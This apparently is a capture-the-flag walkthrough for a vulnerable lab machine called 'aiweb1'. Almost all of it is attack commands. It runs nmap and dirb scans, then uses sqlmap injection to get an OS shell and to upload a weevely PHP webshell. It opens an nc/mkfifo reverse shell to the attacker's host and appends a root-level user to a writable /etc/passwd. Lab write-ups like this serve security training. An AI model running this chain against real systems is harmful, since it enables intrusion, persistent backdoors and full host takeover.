# host discover
`etdiscover -r 192.168.111.0/24`

# port scan
`nmap -p- 192.168.111.130 -A `
# dir scan
`dirb http://192.168.111.130`
`http://192.168.111.130/robots.txt`
`dirb http://192.168.111.130/m3diNf0` 发现info.php 和绝对路径
`dirb http://192.168.111.130/se3reTdir777/ ` 注意不要扫上一级
![image](https://user-images.githubusercontent.com/1063747/180630122-d9afea4b-3062-47b2-88bd-edd2496c62b3.png)

# web root document path
![image](https://user-images.githubusercontent.com/1063747/180630424-6e62ec60-246f-4ca3-af54-730bb069b59c.png)


# SQL inject
![image](https://user-images.githubusercontent.com/1063747/180630178-ad36abec-e781-40ff-bbbf-39527aaa9323.png)

![image](https://user-images.githubusercontent.com/1063747/180630233-273b8115-0d1e-4ef5-b37a-7dd9a6ffab44.png)

`sqlmap -u "http://192.168.111.130/se3reTdir777/index.php" --data "uid=2&Operation=Submit" --dbs `
`sqlmap -u "http://192.168.111.130/se3reTdir777/index.php" --data "uid=2&Operation=Submit" -D aiweb1 `

# SQL inject get shell
`sqlmap -u "http://192.168.111.130/se3reTdir777/index.php" --data "uid=2&Operation=Submit" --os-shell`

![image](https://user-images.githubusercontent.com/1063747/180630495-6ce66948-8ae5-437f-b9e8-7417485d7e64.png)

# weevely oneline torajan
`weevely generate 1 1.php`
the upload 
`sqlmap -u "http://192.168.111.130/se3reTdir777/index.php" --data "uid=2&Operation=Submit" --file-write /home/kali/1.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/1.php`

# Connect
`weevely http://192.168.111.130/se3reTdir777/uploads/1.php 1`

# find root  but failed
found nothing
`find / -user root -perm -4000 -print 2>/dev/null` 
`searchsploit 4.15 `

# kali reverse shell
Running in kali
`nc -lvvp 6666`
running in weevely 反弹shell
`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.111.128 6666 >/tmp/f &`

# find passwd vuln
```
ls -l /etc/passwd
-rw-r--r-- 1 www-data www-data 1664 Aug 21  2019 /etc/passwd
```
`openssl passwd -1 -salt hacker`
相当于把密码替换掉x 创建新用户
![image](https://user-images.githubusercontent.com/1063747/180631040-4a30ac4c-f7b8-45a3-a082-817335e930d1.png)

`echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/usr/bin/zsh' >> /etc/passwd`

# weevely su
这里会失败 weevely 的反弹shell  su 会报错
`:shell_su -user hacker  123456 id`



